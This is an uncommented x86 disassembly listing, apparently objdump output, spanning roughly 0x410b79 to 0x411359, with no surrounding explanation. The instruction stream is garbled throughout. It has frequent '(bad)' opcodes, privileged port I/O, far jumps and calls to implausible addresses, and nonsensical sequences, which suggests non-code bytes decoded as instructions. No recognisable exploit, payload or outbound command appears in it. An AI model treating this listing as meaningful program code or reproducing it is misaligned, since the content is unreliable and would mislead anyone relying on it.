  410b79:	inc    ebp
  410b7a:	push   ebp
  410b7b:	lea    ecx,[ebp-0x27ff4f12]
  410b81:	mov    eax,edi
  410b83:	int3   
  410b84:	push   ebp
  410b85:	xchg   edi,eax
  410b87:	add    esp,ebp
  410b89:	add    BYTE PTR [eax],al
  410b8b:	inc    ebp
  410b8c:	add    BYTE PTR [ebp+0x8b3255],cl
  410b92:	cld    
  410b93:	mov    DWORD PTR [edx],edi
  410b95:	aam    0x75
  410b97:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410b9d:	mov    DWORD PTR [ebx-0x50],edx
  410ba0:	test   BYTE PTR [ebp-0x1],0xe8
  410ba4:	mov    eax,DWORD PTR [eax]
  410ba6:	hlt    
  410ba7:	add    al,al
  410ba9:	mov    eax,DWORD PTR ds:0x890045a8
  410baf:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410bb5:	inc    DWORD PTR [eax*2+0xf75854d]
  410bbc:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410bc2:	call   0x72976903
  410bc7:	je     0x410c27
  410bc9:	js     0x410c2a
  410bcb:	lock ret 0x7e
  410bcf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410bd5:	mov    edi,edi
  410bd7:	sbb    al,bl
  410bd9:	clc    
  410bda:	add    BYTE PTR [ebp-0x73],bh
  410bdd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410be3:	ror    BYTE PTR [eax],1
  410be5:	dec    ebp
  410be6:	xchg   ebp,eax
  410be7:	mov    edi,edi
  410be9:	in     al,0x8b
  410beb:	jge    0x410b76
  410bed:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410bf3:	clc    
  410bf4:	pop    esi
  410bf5:	fist   DWORD PTR [ebp+0x5d398b5d]
  410bfb:	clc    
  410bfc:	add    al,0x6e
  410bfe:	mov    eax,DWORD PTR [ebx]
  410c00:	mov    BYTE PTR [ebp+0x0],dl
  410c03:	mov    edx,DWORD PTR [ebx-0x20]
  410c06:	adc    esi,DWORD PTR [edi+0x5e005f40]
  410c0c:	add    eax,0x3b3b73
  410c11:	adc    al,0x89
  410c13:	pop    eax
  410c14:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410c18:	ret    0xf08
  410c1b:	cmp    al,0x2
  410c1d:	mov    DWORD PTR [edx+0x665500fc],edi
  410c23:	add    eax,ebx
  410c25:	add    esp,eax
  410c27:	sub    eax,eax
  410c29:	or     BYTE PTR [ecx-0x77f474bb],cl
  410c2f:	add    BYTE PTR [eax],al
  410c31:	mov    DWORD PTR [ebx-0x24],ebx
  410c34:	push   edi
  410c35:	push   ebp
  410c36:	clc    
  410c37:	add    DWORD PTR [esi+0x1b0100],0x45
  410c3e:	out    0xff,eax
  410c40:	add    edx,DWORD PTR [eax]
  410c42:	jmp    0x410c2c
  410c44:	cmp    ch,0x48
  410c47:	(bad)  
  410c48:	jmp    0x40c6949a
  410c4d:	je     0x410bd9
  410c4f:	mov    eax,DWORD PTR [eax-0x10c78104]
  410c55:	inc    ebp
  410c56:	add    BYTE PTR [ebx-0x770375],al
  410c5c:	add    ah,ch
  410c5e:	add    edx,esp
  410c60:	pop    edi
  410c61:	pop    ebp
  410c62:	push   ebp
  410c63:	inc    ebx
  410c64:	in     al,dx
  410c65:	pop    ebp
  410c66:	in     al,dx
  410c67:	cmp    edx,DWORD PTR [edi-0x8]
  410c6a:	xor    eax,0x895b9c94
  410c6f:	leave  
  410c70:	call   0x89965379
  410c75:	in     al,dx
  410c76:	in     al,0x45
  410c78:	dec    ebp
  410c79:	push   esi
  410c7a:	test   DWORD PTR [eax+0xfb010f],esi
  410c80:	add    BYTE PTR [eax+0xc018b],dh
  410c86:	leave  
  410c87:	inc    ebp
  410c88:	test   al,ch
  410c8a:	add    dh,bh
  410c8c:	add    bh,bh
  410c8e:	dec    ebp
  410c8f:	push   cs
  410c90:	mov    DWORD PTR [ecx],eax
  410c92:	hlt    
  410c93:	push   es
  410c94:	dec    ebp
  410c95:	leave  
  410c96:	mov    DWORD PTR [eax],ecx
  410c98:	clc    
  410c99:	cmovge eax,ecx
  410c9c:	mov    ecx,0x85c2f0
  410ca2:	clc    
  410ca3:	pop    DWORD PTR [ebp+0x1]
  410ca6:	push   ebx
  410ca7:	add    BYTE PTR [ebp-0x15],bh
  410caa:	push   esi
  410cab:	xor    eax,0x898a45
  410cb0:	cld    
  410cb1:	push   es
  410cb2:	inc    ebp
  410cb3:	add    BYTE PTR [ebx],dh
  410cb5:	pushfw 
  410cb7:	add    DWORD PTR [esi+0x78308c1],edi
  410cbd:	add    ah,BYTE PTR [ebx-0x49]
  410cc0:	int    0xbb
  410cc2:	mov    ecx,DWORD PTR [esi+0xc]
  410cc5:	add    dh,al
  410cc7:	cmp    ecx,ebx
  410cc9:	jne    0x410c93
  410ccb:	xor    ecx,DWORD PTR [ebp+0x66]
  410cce:	jmp    0xc80cd4
  410cd3:	add    DWORD PTR [ebp+0x0],eax
  410cd6:	mov    eax,ebx
  410cd8:	or     al,0x8b
  410cda:	(bad)  
  410cdb:	mov    ecx,esi
  410cdd:	mov    BYTE PTR [eax+eax*1+0x664c13a],cl
  410ce4:	mov    eax,edi
  410ce6:	or     BYTE PTR [edx],cl
  410ce8:	shl    cl,cl
  410cea:	icebp  
  410ceb:	add    BYTE PTR [ebp+0x36],0x8b
  410cef:	or     BYTE PTR [edx+eax*2],cl
  410cf2:	(bad)  
  410cf3:	or     cl,dh
  410cf5:	stc    
  410cf6:	shl    DWORD PTR [ebp-0x30],0xc6
  410cfa:	xor    al,0x0
  410cfc:	inc    ebp
  410cfd:	xchg   BYTE PTR [ebx],al
  410cff:	add    esp,edi
  410d01:	add    BYTE PTR [ebp-0x39],cl
  410d04:	mov    al,bl
  410d06:	test   DWORD PTR [ebx+0x1c348375],ecx
  410d0c:	sub    al,0xbf
  410d0e:	jmp    0x410c95
  410d10:	mov    edi,eax
  410d12:	lock jge 0x410d06
  410d15:	lea    esi,[edx-0x74bad503]
  410d1b:	mov    ebp,esp
  410d1d:	or     cl,dh
  410d1f:	leave  
  410d20:	add    al,BYTE PTR [eax+eax*4-0x37ff9d00]
  410d27:	dec    ebp
  410d28:	dec    ebp
  410d29:	test   DWORD PTR [ebx],eax
  410d2b:	paddb  mm6,mm0
  410d2e:	add    DWORD PTR [eax],eax
  410d30:	dec    ebp
  410d31:	mov    ecx,DWORD PTR [ebx-0x62b217f0]
  410d37:	mov    esi,DWORD PTR [edx]
  410d39:	or     al,0x2b
  410d3b:	dec    ebp
  410d3c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410d42:	mov    esp,ebp
  410d44:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410d4b:	mov    DWORD PTR [ebx],ebp
  410d4d:	call   0xc74967d
  410d52:	mov    DWORD PTR [ebp+0x10],ecx
  410d55:	(bad)  
  410d56:	push   0x8b85ff10
  410d5b:	clc    
  410d5c:	or     al,0x56
  410d5e:	(bad)  
  410d5f:	push   ecx
  410d60:	retf   
  410d61:	mov    ebx,0xff4d8dc8
  410d66:	mov    DWORD PTR [ebp+0x8],eax
  410d69:	xor    eax,DWORD PTR [ebp-0x75]
  410d6c:	cmp    ebp,DWORD PTR [ebx]
  410d6e:	lsl    ebx,WORD PTR [edi-0x8]
  410d72:	call   DWORD PTR [ebx-0x741bff75]
  410d78:	(bad)  
  410d79:	or     al,0x5b
  410d7b:	dec    ebp
  410d7c:	or     BYTE PTR [ebx],dh
  410d7e:	inc    ebp
  410d7f:	xor    esi,DWORD PTR ds:0x708088d
  410d85:	in     eax,0x9d
  410d87:	add    BYTE PTR [edx],dh
  410d89:	inc    ebp
  410d8a:	pop    edi
  410d8b:	xor    eax,edx
  410d8d:	test   DWORD PTR [eax],0x83108b8b
  410d93:	dec    ebp
  410d94:	adc    al,0x33
  410d96:	inc    ebp
  410d97:	xor    esi,DWORD PTR ds:0xc73b9c2b
  410d9d:	jne    0x410d9b
  410d9f:	mov    eax,DWORD PTR [ebp+0x345f808]
  410da5:	mov    eax,DWORD PTR [ebp-0xc]
  410da8:	mov    DWORD PTR [eax],0x685c9f4
  410dae:	clc    
  410daf:	dec    eax
  410db0:	push   edi
  410db1:	ss inc ebp
  410db3:	pop    ss
  410db4:	aad    0x4d
  410db6:	xlat   BYTE PTR ds:[ebx]
  410db7:	or     BYTE PTR [ebx+0x4d63fc56],0xd1
  410dbe:	mov    eax,0x780084d
  410dc3:	push   esi
  410dc4:	clc    
  410dc5:	ret    0xe99d
  410dc8:	xor    dl,dl
  410dca:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410dd0:	js     0x88799cf
  410dd6:	dec    ebp
  410dd7:	push   ebp
  410dd8:	mov    edi,DWORD PTR [eax+0xc872fc]
  410dde:	lock enter 0xceca,0xf2
  410de3:	retf   0x18ce
  410de6:	jne    0x410e35
  410de8:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410dee:	enter  0xf0d6,0xca
  410df2:	retf   0xf2c8
  410df5:	into   
  410df6:	out    dx,al
  410df7:	dec    ebp
  410df8:	dec    ebp
  410df9:	jmp    0xff450d31
  410dfe:	xor    eax,DWORD PTR [ebp-0x15]
  410e01:	xor    esi,DWORD PTR [ebx]
  410e03:	mov    esi,DWORD PTR [ebx]
  410e05:	sub    eax,DWORD PTR [ebx]
  410e07:	add    eax,DWORD PTR [ebx]
  410e09:	or     bl,dl
  410e0b:	dec    ebp
  410e0c:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410e12:	xor    eax,DWORD PTR [ebp-0xf00073]
  410e18:	jb     0x410e5f
  410e1a:	add    BYTE PTR [ebx],dh
  410e1c:	dec    ebp
  410e1d:	pop    esi
  410e1e:	mov    ebp,ebx
  410e20:	cld    
  410e21:	mov    esi,eax
  410e23:	call   0x520f64f0
  410e28:	stc    
  410e29:	add    eax,0x4572aa
  410e2e:	pop    edi
  410e2f:	leave  
  410e30:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410e37:	in     al,dx
  410e38:	mov    eax,edi
  410e3a:	xor    eax,0xf8008520
  410e40:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410e47:	mov    eax,DWORD PTR [ebp-0x77]
  410e4a:	xor    bh,al
  410e4c:	pushf  
  410e4d:	inc    ebp
  410e4e:	(bad)  
  410e4f:	cmp    eax,0x56869ce8
  410e54:	clc    
  410e55:	mov    edi,0x8518e4ec
  410e5b:	jmp    0xf056:0x8b457df8
  410e62:	push   esi
  410e63:	push   esi
  410e64:	push   ecx
  410e65:	push   ecx
  410e66:	push   edi
  410e67:	xor    eax,esi
  410e69:	mov    edx,0x32729d
  410e6e:	add    ecx,eax
  410e70:	mov    edx,edi
  410e72:	clc    
  410e73:	retf   0xaf45
  410e76:	cmp    eax,0xc78b9ceb
  410e7b:	clc    
  410e7c:	cld    
  410e7d:	jne    0x410e97
  410e7f:	xor    ebp,edx
  410e81:	xor    eax,DWORD PTR [ebp+0x3]
  410e84:	or     BYTE PTR [ebx],al
  410e86:	add    BYTE PTR [ebp-0x7747475],al
  410e8c:	hlt    
  410e8d:	dec    ebp
  410e8e:	dec    ebp
  410e8f:	je     0x410ec4
  410e91:	xor    esi,DWORD PTR [ebx]
  410e93:	xor    eax,DWORD PTR [ebx]
  410e95:	add    eax,DWORD PTR [ebx]
  410e97:	add    ecx,DWORD PTR [edi]
  410e99:	rol    ecx,cl
  410e9b:	mov    esi,DWORD PTR [ecx]
  410e9d:	in     al,dx
  410e9e:	inc    ebp
  410e9f:	enter  0xca2b,0x33
  410ea3:	icebp  
  410ea4:	mov    DWORD PTR [edx],ecx
  410ea6:	clc    
  410ea7:	lock pop ebp
  410ea9:	enter  0xf2e8,0xfe
  410ead:	retf   0xeeff
  410eb0:	inc    ebp
  410eb1:	jne    0x410e3e
  410eb3:	mov    edi,eax
  410eb5:	cld    
  410eb6:	dec    ebp
  410eb7:	enter  0xbc89,0x8d
  410ebb:	popf   
  410ebc:	sti    
  410ebd:	xor    bh,bh
  410ebf:	mov    eax,DWORD PTR [ebp-0xc]
  410ec2:	mov    esi,DWORD PTR [ebp-0x4]
  410ec5:	xor    eax,esi
  410ec7:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9d]
  410ece:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410ed4:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410eda:	(bad)  
  410edb:	push   ebp
  410edc:	shr    esp,0x4d
  410edf:	in     al,dx
  410ee0:	cmp    eax,DWORD PTR [esi+esi*2]
  410ee3:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  410ee9:	pushf  
  410eea:	mov    edi,0x85c7f445
  410ef0:	call   0xf88695ed
  410ef5:	xor    eax,0x53619cdb
  410efa:	dec    ebp
  410efb:	inc    ebp
  410efc:	mov    esi,DWORD PTR [eax+edi*8]
  410eff:	pushf  
  410f00:	into   
  410f01:	mov    ecx,edi
  410f03:	in     al,dx
  410f04:	call   0x8b4954c7
  410f09:	pop    es
  410f0a:	or     BYTE PTR [ebx],dh
  410f0c:	or     BYTE PTR [edi+0x8a724d],bh
  410f12:	or     eax,edi
  410f14:	push   ebp
  410f15:	inc    ebp
  410f16:	cmpxchg8b (bad)
  410f17:	(bad)  
  410f18:	leave  
  410f19:	loopne 0x410ee5
  410f1b:	test   DWORD PTR [ebp-0x8],ecx
  410f1e:	mov    eax,DWORD PTR [ebp-0x18]
  410f21:	aad    0x55
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	xor    eax,edi
  410f26:	add    esi,eax
  410f28:	and    eax,DWORD PTR [eax]
  410f2a:	mov    eax,DWORD PTR [eax]
  410f2c:	(bad)  
  410f2d:	leave  
  410f2e:	sti    
  410f2f:	inc    ebp
  410f30:	dec    DWORD PTR [ebx-0x39cc13ab]
  410f36:	mov    esi,ecx
  410f38:	clc    
  410f39:	(bad)  
  410f3a:	dec    ebp
  410f3b:	iret   
  410f3c:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410f42:	jb     0x410f40
  410f44:	add    bh,al
  410f46:	inc    ebp
  410f47:	(bad)  
  410f48:	mov    eax,DWORD PTR [ebp-0xc]
  410f4b:	(bad)  
  410f4c:	xabort 0x63
  410f4f:	loopne 0x410f1e
  410f51:	jmp    FWORD PTR [ebx]
  410f53:	mov    DWORD PTR [ebx],eax
  410f55:	clc    
  410f56:	lock inc ebp
  410f58:	dec    ebp
  410f59:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410f5f:	loopne 0x410f94
  410f61:	inc    DWORD PTR [ebx]
  410f63:	mov    edi,DWORD PTR [ebx]
  410f65:	hlt    
  410f66:	jne    0x410fb5
  410f68:	mov    esi,DWORD PTR [ebx]
  410f6a:	in     al,0x8d
  410f6c:	dec    ebp
  410f6d:	or     BYTE PTR [ebx],dh
  410f6f:	jb     0x410f74
  410f71:	add    BYTE PTR [edi+0x45],bl
  410f74:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410f7a:	add    BYTE PTR [ebx],dh
  410f7c:	mov    esi,DWORD PTR [ebx]
  410f7e:	mov    ebp,DWORD PTR [ebx]
  410f80:	sbb    BYTE PTR [ebx-0x377403b3],cl
  410f86:	nop
  410f87:	mov    ecx,0x338b4500
  410f8c:	add    DWORD PTR [ebx],0x70
  410f8f:	mov    DWORD PTR [esi-0x8],edx
  410f92:	jne    0x410fd9
  410f94:	mov    esi,DWORD PTR [edi+edx*2]
  410f97:	pushf  
  410f98:	push   esi
  410f99:	mov    edx,DWORD PTR [ecx-0x15]
  410f9c:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  410fa2:	add    BYTE PTR [ebx],dh
  410fa4:	retf   
  410fa5:	add    edx,ecx
  410fa7:	ror    DWORD PTR [edi],cl
  410fa9:	mov    DWORD PTR ds:0x7f452dfc,ebp
  410faf:	mov    ch,dl
  410fb1:	mov    BYTE PTR [eax+0xb],dh
  410fb4:	fimul  WORD PTR [ebp+0x0]
  410fb7:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  410fbd:	xor    esi,DWORD PTR [ebx]
  410fbf:	mov    DWORD PTR [ebx],esi
  410fc1:	or     BYTE PTR [ebx],al
  410fc3:	dec    ebp
  410fc4:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  410fca:	or     edi,0x8c64ca9c
  410fd0:	out    dx,eax
  410fd1:	loopne 0x410fe8
  410fd3:	(bad)  
  410fd4:	jmp    0x13d1464
  410fd9:	retf   0x4d4d
  410fdc:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  410fe2:	je     0x3241ad8c
  410fe8:	mov    ecx,DWORD PTR [ecx+0x45450818]
  410fee:	mov    DWORD PTR [ebx],esi
  410ff0:	sbb    BYTE PTR [ecx-0x7472b3],bh
  410ff6:	mov    eax,ecx
  410ff8:	fmul   DWORD PTR [ebp+0x45]
  410ffb:	mov    DWORD PTR ds:0xba459cf0,esi
  411001:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  411007:	(bad)  
  411008:	mov    ecx,eax
  41100a:	sbb    BYTE PTR [ecx-0x7474babb],dl
  411010:	sbb    al,bh
  411012:	add    dh,0x1
  411015:	mov    DWORD PTR [eax],0x4dc1005e
  41101b:	leave  
  41101c:	mov    eax,DWORD PTR [eax+ebx*1]
  41101f:	push   ebp
  411020:	mov    esp,ebp
  411022:	add    DWORD PTR [ebp+0x0],eax
  411025:	mov    ecx,DWORD PTR [ecx]
  411027:	or     BYTE PTR [eax-0x80],cl
  41102a:	mov    DWORD PTR [ecx],eax
  41102c:	or     al,0x0
  41102e:	inc    ebp
  41102f:	add    BYTE PTR [ebx],dh
  411031:	in     al,dx
  411032:	add    edx,DWORD PTR [ebx-0x77]
  411035:	mov    esi,esp
  411037:	adc    BYTE PTR [ebp+0x16],al
  41103a:	xor    edi,DWORD PTR [edi+0x7890803]
  411040:	adc    al,0xcf
  411042:	inc    ebp
  411043:	popf   
  411044:	mov    esi,DWORD PTR [edx]
  411046:	push   eax
  411047:	add    ebp,eax
  411049:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  41104f:	pushf  
  411050:	mov    esp,DWORD PTR [eax+edi*1+0x44]
  411054:	dec    ebp
  411055:	fwait
  411056:	dec    eax
  411057:	jmp    0xcc149d
  41105c:	or     al,0x4d
  41105e:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  411064:	or     al,0xd7
  411066:	dec    ecx
  411067:	retf   
  411068:	dec    eax
  411069:	rcl    eax,cl
  41106b:	retf   0xfc8
  41106e:	inc    ebp
  41106f:	or     eax,0x7f382d8b
  411074:	sar    esp,0x3
  411077:	lahf   
  411078:	inc    eax
  411079:	mov    ebp,0x8b180089
  41107e:	inc    ebp
  41107f:	or     BYTE PTR [ebx],dh
  411081:	iret   
  411082:	add    ecx,ebx
  411084:	mov    ecx,eax
  411086:	adc    al,0x84
  411088:	inc    ebp
  411089:	add    al,0x33
  41108b:	add    BYTE PTR [ebx],al
  41108d:	dec    ebp
  41108e:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  411094:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  41109a:	ret    
  41109b:	inc    ebp
  41109c:	add    edi,eax
  41109e:	push   ebp
  41109f:	or     bh,al
  4110a1:	test   DWORD PTR [eax+edi*8],edx
  4110a4:	test   DWORD PTR [edx],esi
  4110a6:	clc    
  4110a7:	pushf  
  4110a8:	inc    ebp
  4110a9:	mov    DWORD PTR [eax],esi
  4110ab:	lock pushf 
  4110ad:	inc    ebp
  4110ae:	(bad)  
  4110af:	mov    DWORD PTR [eax+ebx*1],edx
  4110b2:	test   DWORD PTR [ebp-0x8],eax
  4110b5:	mov    eax,DWORD PTR [ebp-0x70]
  4110b8:	mov    eax,DWORD PTR [eax]
  4110ba:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	dec    ebp
  4110c2:	mov    ecx,DWORD PTR [ebx+0x559008]
  4110c8:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  4110ce:	jb     0x41111d
  4110d0:	add    BYTE PTR [ebx-0x387cf73f],cl
  4110d6:	add    eax,ebx
  4110d8:	add    BYTE PTR [ebp+0x45],al
  4110db:	mov    esi,DWORD PTR [ebx]
  4110dd:	or     BYTE PTR [ebx],al
  4110df:	(bad)  
  4110e0:	mov    ebx,eax
  4110e2:	adc    al,0x45
  4110e4:	inc    ebp
  4110e5:	mov    eax,DWORD PTR [ebx]
  4110e7:	or     al,0xdc
  4110e9:	inc    eax
  4110ea:	inc    ebp
  4110eb:	cmp    edi,0xc
  4110ee:	hlt    
  4110ef:	inc    ebp
  4110f0:	jne    0x41107d
  4110f2:	mov    ecx,DWORD PTR [esp+ecx*1]
  4110f5:	inc    eax
  4110f6:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  4110fc:	clc    
  4110fd:	push   esp
  4110fe:	inc    ebp
  4110ff:	inc    ebp
  411100:	cmp    eax,0x8b8b9c74
  411105:	cmp    al,ah
  411107:	dec    ebp
  411108:	(bad)  
  411109:	mov    eax,ebx
  41110b:	push   esp
  41110c:	(bad)  
  41110d:	idiv   DWORD PTR [eax-0x87417dd]
  411113:	or     al,0xff
  411115:	inc    eax
  411116:	inc    ebp
  411117:	add    eax,DWORD PTR [ebp-0x74748b15]
  41111d:	push   esp
  41111e:	loopne 0x411165
  411120:	(bad)  
  411121:	mov    eax,ebx
  411123:	or     bh,bh
  411125:	xbegin 0x508656ee
  41112b:	mov    ebx,esp
  41112d:	or     bh,bh
  41112f:	(bad)  
  411130:	mov    eax,ebx
  411132:	hlt    
  411133:	inc    ebp
  411134:	inc    ebp
  411135:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  41113b:	xor    ebp,DWORD PTR [ebx]
  41113d:	add    ecx,DWORD PTR [ecx+0x4589e089]
  411143:	adc    al,0x8b
  411145:	inc    ebp
  411146:	clc    
  411147:	xor    eax,DWORD PTR [eax-0x64]
  41114a:	add    eax,edi
  41114c:	or     al,0x14
  41114e:	dec    ebp
  41114f:	test   DWORD PTR [ebx],edi
  411151:	clc    
  411152:	jb     0x411199
  411154:	mov    esi,DWORD PTR [ecx]
  411156:	clc    
  411157:	pushf  
  411158:	inc    eax
  411159:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  41115f:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  411165:	shr    esi,0x4d
  411168:	add    BYTE PTR [ebx-0x30002f96],cl
  41116e:	hlt    
  41116f:	mov    WORD PTR [ebp-0x63],es
  411172:	push   eax
  411173:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  41117a:	test   DWORD PTR [eax],eax
  41117c:	clc    
  41117d:	mov    eax,DWORD PTR [ebp+0x8]
  411180:	mov    edi,0x4585c3c8
  411186:	clc    
  411187:	mov    eax,DWORD PTR [ebp+0x18]
  41118a:	xor    eax,DWORD PTR [ebp-0x64]
  41118d:	mov    edi,eax
  41118f:	hlt    
  411190:	shl    BYTE PTR [ebp-0x7b],0x8b
  411194:	clc    
  411195:	fmul   QWORD PTR [ebp+0x4d]
  411198:	mov    eax,ebp
  41119a:	in     al,dx
  41119b:	icebp  
  41119c:	dec    ebp
  41119d:	dec    DWORD PTR [ecx+0x4dc7e845]
  4111a3:	loopne 0x41112e
  4111a5:	test   eax,edi
  4111a7:	clc    
  4111a8:	dec    ebp
  4111a9:	inc    ebp
  4111aa:	mov    DWORD PTR [ebx],esi
  4111ac:	in     al,0x3
  4111ae:	dec    ebp
  4111af:	push   eax
  4111b0:	xor    eax,DWORD PTR [ebp+0x3]
  4111b3:	push   eax
  4111b4:	mov    DWORD PTR [eax-0x20],edx
  4111b7:	push   edi
  4111b9:	mov    eax,DWORD PTR [eax]
  4111bb:	clc    
  4111bc:	cmp    eax,0xf84e85c0
  4111c1:	inc    ebp
  4111c2:	test   BYTE PTR [ebx],dh
  4111c4:	add    DWORD PTR [ebx],eax
  4111c6:	add    BYTE PTR [eax+0x4d],dl
  4111c9:	jne    0x4111fe
  4111cb:	lea    ecx,[ebx-0x7617fc48]
  4111d1:	cmc    
  4111d2:	adc    al,0xff
  4111d4:	inc    ebp
  4111d5:	inc    ebp
  4111d6:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  4111dc:	jb     0x411169
  4111de:	add    ah,bl
  4111e0:	inc    ebp
  4111e1:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  4111e8:	xor    ecx,DWORD PTR [ebp+0x3]
  4111eb:	mov    edi,DWORD PTR [ebx]
  4111ed:	adc    BYTE PTR [ebp+0x41],dh
  4111f0:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  4111f6:	ret    
  4111f7:	push   ss
  4111f8:	push   0x45
  4111fa:	lea    ecx,[ebx+0x4de80cac]
  411200:	cli    
  411201:	add    edi,edi
  411203:	or     BYTE PTR [ebp+0x4d],al
  411206:	mov    ebp,DWORD PTR [ebx]
  411208:	xor    ebp,ecx
  41120a:	mov    al,BYTE PTR [edx]
  41120c:	add    eax,0xc7200
  411211:	jne    0x411260
  411213:	lea    esi,[ebx]
  411215:	lods   al,BYTE PTR ds:[esi]
  411216:	psubsb mm0,mm0
  411219:	cmc    
  41121a:	retf   
  41121b:	inc    ecx
  41121d:	xor    eax,0x89019c84
  411222:	add    ah,cl
  411224:	inc    ebp
  411225:	inc    ebp
  411226:	mov    esi,DWORD PTR [edx]
  411228:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c405c7]
  41122f:	test   DWORD PTR [eax],eax
  411231:	clc    
  411232:	dec    ebp
  411233:	inc    ebp
  411234:	xor    esi,DWORD PTR [eax]
  411236:	setl   al
  411239:	(bad)  
  41123a:	retf   
  41123b:	int3   
  41123c:	ror    DWORD PTR [ebp-0x7c],0x8d
  411240:	add    eax,ecx
  411242:	add    BYTE PTR [ebp+0x45],cl
  411245:	lea    ecx,[ebx-0x75b2cc3c]
  41124b:	lea    eax,ds:0x4d72c0
  411251:	mov    ecx,DWORD PTR [ebp+0x8]
  411254:	xor    ecx,edi
  411256:	bswap  ebx
  411258:	ror    BYTE PTR [ebp-0x35],0xe9
  41125c:	rol    DWORD PTR [ecx],0x84
  41125f:	add    BYTE PTR [ecx],al
  411261:	xor    eax,DWORD PTR [eax]
  411263:	pushf  
  411264:	inc    ebp
  411265:	jnp    0x8a414669
  41126b:	mov    eax,DWORD PTR ds:0xcf72f0
  411271:	lock dec ebp
  411273:	retf   
  411274:	xor    ecx,DWORD PTR [ebp+0xf]
  411277:	mov    eax,eax
  411279:	loopne 0x411246
  41127b:	test   ecx,0x19d8484
  411281:	xor    al,BYTE PTR [eax]
  411283:	mov    DWORD PTR [ebp-0x20],eax
  411286:	mov    eax,DWORD PTR [ebp+0x33]
  411289:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  41128f:	ret    
  411290:	add    al,cl
  411292:	dec    ebp
  411293:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  411299:	add    ecx,DWORD PTR ds:0xc7250
  41129f:	inc    ebp
  4112a0:	rcl    DWORD PTR [eax+0x4d],0x5f
  4112a4:	mov    edi,edi
  4112a6:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  4112ac:	jb     0x411275
  4112ae:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4112b5:	mov    esi,DWORD PTR [ebx]
  4112b7:	or     BYTE PTR [edx+0x72b60dcf],cl
  4112bd:	add    eax,DWORD PTR [eax]
  4112bf:	cmp    ecx,eax
  4112c1:	jne    0x41133f
  4112c7:	mov    eax,DWORD PTR [ebp-0x18]
  4112ca:	mov    eax,DWORD PTR [eax]
  4112cc:	xor    eax,edi
  4112ce:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4112d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d8:	mov    ecx,edi
  4112da:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4112e0:	jb     0x4112f1
  4112e2:	add    BYTE PTR [eax-0x3f],bl
  4112e5:	add    BYTE PTR [ebp-0x75],cl
  4112e8:	mov    edi,eax
  4112ea:	xor    eax,DWORD PTR [eax]
  4112ec:	mov    al,bh
  4112ee:	or     eax,0x497284
  4112f3:	xor    al,cl
  4112f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112f8:	mov    ecx,edi
  4112fa:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  411300:	jb     0x411311
  411302:	add    BYTE PTR [eax],bh
  411304:	enter  0x8500,0x8b
  411308:	add    ah,ah
  41130a:	add    BYTE PTR [eax],al
  41130c:	inc    ebp
  41130d:	(bad)  
  41130e:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  411315:	mov    esi,DWORD PTR [edx+0x8]
  411318:	add    bh,cl
  41131a:	dec    ebp
  41131b:	mov    dh,0x8b
  41131d:	add    esi,DWORD PTR [ebx]
  41131f:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  411325:	add    BYTE PTR [eax],al
  411327:	mov    eax,ecx
  411329:	call   0xc7cc137b
  41132e:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d49]
  411335:	mov    eax,DWORD PTR [eax]
  411337:	in     al,dx
  411338:	ror    DWORD PTR [ecx],0x4d
  41133b:	iret   
  41133c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  411343:	xor    dh,BYTE PTR [edx-0x75]
  411346:	add    al,bh
  411348:	enter  0x5009,0xcf
  41134c:	inc    ebp
  41134d:	mov    WORD PTR [ebx-0x75cdccb7],cs
  411353:	or     al,BYTE PTR ds:0xec728b
  411359:	or     DWORD PTR [ebp-0x31],ecx
